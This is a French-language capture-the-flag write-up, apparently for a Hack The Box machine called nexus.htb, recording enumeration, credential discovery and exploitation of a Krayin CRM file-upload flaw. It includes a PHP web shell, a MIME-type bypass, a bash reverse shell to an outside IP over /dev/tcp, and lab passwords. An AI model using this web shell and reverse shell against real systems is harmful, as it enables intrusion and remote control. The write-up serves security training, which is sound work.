# Port enum:
```bash
nmap -p- nexus.htb
```

# Subdomain enum:
```bash
wfuzz -c --hw 10 -Z -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nexus.htb" http://nexus.htb 
```

# DB Password:
Aller sur le git regarder l'history du .env et boom

# Version de krayin CRM:
Se logger sur billing avec le mail trouvé (j.matthew@nexus.htb) et le mot de passe (N27xh!!2ucY04)

# Exploitation CVE-2026-38526
Dans le formulaire d'envoie de mail il y a un endroit pour upload une PJ.
On crée `shell.php`

```php
<?php system($_GET['cmd']); ?>
```

Puis avec burp suit on intercept l'upload du fichier pour changer le mime type par image/png. On récupère l'URL de retour avec le chemin et boom
On écoute avec netcat
```bash
nc -lvnp 4444
```

Puis on execute
```bash
curl -G "http://billing.nexus.htb/storage/tinymce/861103c6ece20a3cc9d1ecbf09bb3045.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.137/4444 0>&1'"
```

# Obtenir le mdp de jones
Une fois dans le reverse shell, on regarde dans /var/www et on voit un dossier krayin. Dans le dossier krayin il y a un .env avec un nouveau mdp (y27xb3ha!!74GbR). Si on tente de ssh dans la vm avec le user jones et le mdp on voit que ça passe sans souci. Le flag est dans un txt dans le home de jones

# Timer de con
```bash
systemctl list-timers --all
```

gitea-template-sync.service

